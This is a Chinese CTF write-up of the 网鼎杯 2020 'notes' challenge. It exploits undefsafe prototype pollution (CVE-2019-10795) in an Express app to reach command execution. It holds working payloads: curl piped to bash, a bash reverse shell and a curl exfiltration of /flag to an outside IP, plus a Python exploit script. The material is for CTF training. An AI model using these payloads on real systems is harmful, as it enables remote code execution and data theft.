---
title: '[网鼎杯 2020 青龙组]notes'
date: 2024-10-21 19:03:24
tags: 
      - shell反弹
      -	原型链污染
categories: 刷题笔记
---

### [网鼎杯 2020 青龙组]notes

原型链污染的题https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940

undefsafe在2.03版本下会产生漏洞

<!--more-->

```
var express = require('express');
var path = require('path');
const undefsafe = require('undefsafe');
const { exec } = require('child_process');


var app = express();
class Notes {
    constructor() {
        this.owner = "whoknows";
        this.num = 0;
        this.note_list = {};
    }

    write_note(author, raw_note) {
        this.note_list[(this.num++).toString()] = {"author": author,"raw_note":raw_note};
    }

    get_note(id) {
        var r = {}
        undefsafe(r, id, undefsafe(this.note_list, id));
        return r;
    }

    edit_note(id, author, raw) {
        undefsafe(this.note_list, id + '.author', author);
        undefsafe(this.note_list, id + '.raw_note', raw);
    }

    get_all_notes() {
        return this.note_list;
    }

    remove_note(id) {
        delete this.note_list[id];
    }
}

var notes = new Notes();
notes.write_note("nobody", "this is nobody's first note");


app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));


app.get('/', function(req, res, next) {
  res.render('index', { title: 'Notebook' });
});

app.route('/add_note')
    .get(function(req, res) {
        res.render('mess', {message: 'please use POST to add a note'});
    })
    .post(function(req, res) {
        let author = req.body.author;
        let raw = req.body.raw;
        if (author && raw) {
            notes.write_note(author, raw);
            res.render('mess', {message: "add note sucess"});
        } else {
            res.render('mess', {message: "did not add note"});
        }
    })

app.route('/edit_note')
    .get(function(req, res) {
        res.render('mess', {message: "please use POST to edit a note"});
    })
    .post(function(req, res) {
        let id = req.body.id;
        let author = req.body.author;
        let enote = req.body.raw;
        if (id && author && enote) {
            notes.edit_note(id, author, enote);
            res.render('mess', {message: "edit note sucess"});
        } else {
            res.render('mess', {message: "edit note failed"});
        }
    })

app.route('/delete_note')
    .get(function(req, res) {
        res.render('mess', {message: "please use POST to delete a note"});
    })
    .post(function(req, res) {
        let id = req.body.id;
        if (id) {
            notes.remove_note(id);
            res.render('mess', {message: "delete done"});
        } else {
            res.render('mess', {message: "delete failed"});
        }
    })

app.route('/notes')
    .get(function(req, res) {
        let q = req.query.q;
        let a_note;
        if (typeof(q) === "undefined") {
            a_note = notes.get_all_notes();
        } else {
            a_note = notes.get_note(q);
        }
        res.render('note', {list: a_note});
    })

app.route('/status')
    .get(function(req, res) {
        let commands = {
            "script-1": "uptime",
            "script-2": "free -m"
        };
        for (let index in commands) {
            exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) => {
                if (err) {
                    return;
                }
                console.log(`stdout: ${stdout}`);
            });
        }
        res.send('OK');
        res.end();
    })


app.use(function(req, res, next) {
  res.status(404).send('Sorry cant find that!');
});


app.use(function(err, req, res, next) {
  console.error(err.stack);
  res.status(500).send('Something broke!');
});


const port = 8080;
app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))

```

漏洞点在/status路由下，exec能够进行任意代码执行，我们只需要污染command字典，通过command字典来执行我们的命令

```
app.route('/status')
    .get(function(req, res) {
        let commands = {
            "script-1": "uptime",
            "script-2": "free -m"
        };
        for (let index in commands) {
            exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) => {
                if (err) {
                    return;
                }
                console.log(`stdout: ${stdout}`);
            });
        }
        res.send('OK');
        res.end();
    })

```

我们发现在/edit_note下可以传递三个参数，id，author和enote

```

app.route('/edit_note')
    .get(function(req, res) {
        res.render('mess', {message: "please use POST to edit a note"});
    })
    .post(function(req, res) {
        let id = req.body.id;
        let author = req.body.author;
        let enote = req.body.raw;
        if (id && author && enote) {
            notes.edit_note(id, author, enote);
            res.render('mess', {message: "edit note sucess"});
        } else {
            res.render('mess', {message: "edit note failed"});
        }
    })

```

传入后会直接写入当前的note_list

```
class Notes {
    constructor() {
        this.owner = "whoknows";
        this.num = 0;
        this.note_list = {};
    }

    write_note(author, raw_note) {
        this.note_list[(this.num++).toString()] = {"author": author,"raw_note":raw_note};
    }

    get_note(id) {
        var r = {}
        undefsafe(r, id, undefsafe(this.note_list, id));
        return r;
    }

    edit_note(id, author, raw) {
        undefsafe(this.note_list, id + '.author', author);
        undefsafe(this.note_list, id + '.raw_note', raw);
    }

```

接受用户传参并使用，可以利用这点命令执行
playload:`

```bash
id=__proto__&author=curl 靶机名/1.txt|bash&raw=123
```

![image-20241021195603126](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410211956236.png)

我们在虚拟机上的/var/www/html写一个shell文件并监听，在访问status时就会反弹shell

```
bash -i >& /dev/tcp/60.204.158.87/2333 0>&1
```

在edit_note下传入参数，再访问status

成功连接上

![image-20241021204059543](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410212040725.png)

我们再在edit_note里写入访问flag的命令

```
id=__proto__.bb&author=curl -F "FLAG=@/flag" 60.204.158.87:2333&raw=a
```

我们访问status，得到flag

![image-20241021204331010](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410212043052.png)





或者利用脚本

```
import requests
r = requests.Session()
url = "http://e8af756d-8fa5-4cfd-a295-7bc1a07fd49a.node5.buuoj.cn:81/"
data = {'id': '__proto__', 'author': 'curl -F \'flag=@/flag\' IP:2333', 'raw': '123'}   #bash -i > /dev/tcp/IP/2333 0>&1
a = r.post(url=url + "edit_note", data=data)
print(a.text)
if "Something" in a.text:
    b = r.get(url=url + "status")
    print(b.text)
```



### undefsafe作用

```javascript
var object = {
	a: {b: [1,2,3]}
};
var res = undefsafe(object, 'a.b.0', 10);
console.log(object); // { a: { b: [10, 2, 3] } }
//这里可以看见1被替换成了10
```

[CVE-2019-10795 原型链污染(Prototype Pollution)](https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940)

在版本小于2.0.3的`undefsafe`函数有漏洞，可以污染**所有对象**的原型链，给对象添加属性。

POC如下，污染原型链后，空对象多了个`ddd`属性，且`{}.ddd=JHU`。

```javascript
var a = require("undefsafe");
var b = {};
var c = {};
var payload = "__proto__.ddd";
a(b,payload,"JHU");
console.log(c.ddd);
```



### bash -i >& /dev/tcp/IP/2333 0>&1

这条命令是在 Bash 中用于创建反向 Shell 的一种方法。它的作用是：

- `bash -i` 启动一个交互式 Bash shell。
- `>& /dev/tcp/IP/2333 将标准输出和标准错误重定向到指定 IP 地址（`IP`）的 9999 端口。这里的 `/dev/tcp/` 是 Bash 特有的功能，允许通过 TCP 连接到指定的主机和端口。
- `0>&1` 将标准输入重定向到标准输出，这样从远程主机接收到的数据可以被 Bash 处理。

换句话说，当执行这个命令时，目标主机会连接到指定的 IP 地址和端口，并通过该连接进行命令交互。这种方法通常用于安全测试和渗透测试，但在没有授权的情况下使用是非法的。请务必确保你有权限进行这样的操作。

### Undefsafe 模块原型链污染（CVE-2019-10795）

不光是 Merge 操作容易造成原型链污染，undefsafe 模块也可以原型链污染。undefsafe 是 Nodejs 的一个第三方模块，其核心为一个简单的函数，用来处理访问对象属性不存在时的报错问题。但其在低版本（< 2.0.3）中存在原型链污染漏洞，攻击者可利用该漏洞添加或修改 Object.prototype 属性。

总结来说undefsafe就是可以将一个以下的报错改成不报错，改成undefined

```js
var a = require("undefsafe");

console.log(a(object,'a.b.e'))
// skysec
console.log(object.a.b.e)
// skysec
console.log(a(object,'a.c.e'))
// undefined
console.log(object.a.c.e)
// TypeError: Cannot read property 'e' of undefined
```

#### 当 undefsafe() 函数的第 2，3 个参数可控时，我们可以污染 object 对象中的值

```js
a(test,'__proto__.toString',function(){ return 'just a evil!'})
console.log('this is '+test)    // 将test对象与字符串'this is '进行拼接
// this is just a evil!
```

### js原型链污染：

例子：

```js
object1 = {"a":1, "b":2};
object1.__proto__.foo = "Hello World";
console.log(object1.foo);
object2 = {"c":1, "d":2};
console.log(object2.foo);
```

最终会输出两个 Hello World。为什么 object2 在没有设置 foo 属性的情况下，也会输出 Hello World 呢？就是因为在第二条语句中，我们对 object1 的原型对象设置了一个 foo 属性，而 object2 和 object1 一样，都是继承了 Object.prototype。在获取 object2.foo 时，由于 object2 本身不存在 foo 属性，就会往父类 Object.prototype 中去寻找。这就造成了一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。

要点：一直找同类的原型的属性，一直找到原型的原型为NULL为止
